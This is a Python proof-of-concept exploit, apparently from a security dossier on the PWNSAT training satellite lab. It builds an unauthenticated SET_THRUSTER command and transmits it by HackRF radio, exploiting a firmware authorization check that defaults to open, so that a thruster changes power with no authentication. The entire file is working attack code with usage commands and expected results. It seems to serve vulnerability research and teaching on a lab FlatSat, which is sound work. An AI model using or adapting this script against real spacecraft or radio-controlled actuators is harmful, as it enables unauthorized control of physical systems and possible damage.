#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 03_command_injection_rf.py -- unauthenticated SET_THRUSTER (dossier
# section 04, finding #17). Root cause: groundStationCommandAllowed()
# (worker.cpp) returns true for every APID the instant
# mission_ctx.groundStationModeEnabled is false -- and that flag starts
# false by default in the compiled firmware (finding #13, the same root
# cause behind RESETC (07), fuzzing crash's neighbor findings, and most
# of this dossier). SET_THRUSTER's own handler adds nothing on top: it
# reads data[0] as thruster ID and data[1] as raw power (0-255, no clamp)
# and writes it straight to the actuator.
#
# Unlike 02 (memory-safety bug) this is a completely intended, working
# command -- the vulnerability is purely "nobody checked who's allowed to
# call it." A real actuator changes state with zero authentication.
#
# Needs a Python with gnuradio importable -- run it and this script will
# say so with concrete next steps if you've got the wrong one, see
# require_gnuradio.py / PWNSAT-C3's INSTALL.md (github.com/Pwnsat/PWNSAT-C3):
#   ./03_command_injection.py
#   ./03_command_injection.py --thruster-id 0 --power 255   # full power, thruster 0
#   ./03_command_injection.py --thruster-id 1 --power 200
#
# Expected result: on the FlatSat's serial console, immediately (no auth
# prompt, no delay) --
#   Thruster 0 changed to: 255
# On PWNSAT-C3: the Thruster 0 gauge/sparkline jumps to the new value
# without the operator having touched anything; the THRUSTERS health ring
# flips to warn if power >=200 (same threshold already built into the
# dashboard).

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from pwnsat_packets import build_command_packet  # noqa: E402 -- pure packet building, no gnuradio needed

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()  # exits with a clear message here if this Python can't import gnuradio

from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--thruster-id", type=int, choices=[0, 1], default=0,
                        help="which thruster to command (0 or 1)")
    parser.add_argument("--power", type=int, default=200, metavar="0-255",
                        help="raw power value, no clamp on the firmware side")
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--device-args", default="hackrf", help="SoapySDR driver, e.g. 'hackrf'")
    parser.add_argument("--gain", type=int, default=20, help="HackRF TX (VGA) gain, dB")
    parser.add_argument("--frequency", type=int, default=UPLINK_FREQ_HZ, help="Hz")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output (shown by default as "
                             "visible proof this is a real RF transmission, not just "
                             "this script's own print statements)")
    args = parser.parse_args()

    if not 0 <= args.power <= 255:
        parser.error("--power must be 0-255")

    raw_spp = build_command_packet(
        "thruster", seq=args.seq, encrypt=(args.encrypt == "on"),
        thruster_id=args.thruster_id, power=args.power,
    )

    print(f"[*] SET_THRUSTER packet ({'encrypted' if args.encrypt == 'on' else 'cleartext'}, "
          f"seq={args.seq}): {raw_spp.hex()}")
    print(f"[*] thruster_id={args.thruster_id}  power={args.power} -- no authentication required")
    print(f"[*] Transmitting on {args.frequency / 1e6:.3f} MHz via {args.device_args} "
          f"(gain={args.gain} dB)...")

    transmit_packet(raw_spp, frequency=args.frequency, device_args=args.device_args,
                    verbose=not args.quiet,
                    tx_gain=args.gain)

    print(f"[+] Sent. Check the FlatSat's serial console (\"Thruster {args.thruster_id} "
          f"changed to: {args.power}\") and PWNSAT-C3's Thruster gauge.")


if __name__ == "__main__":
    main()
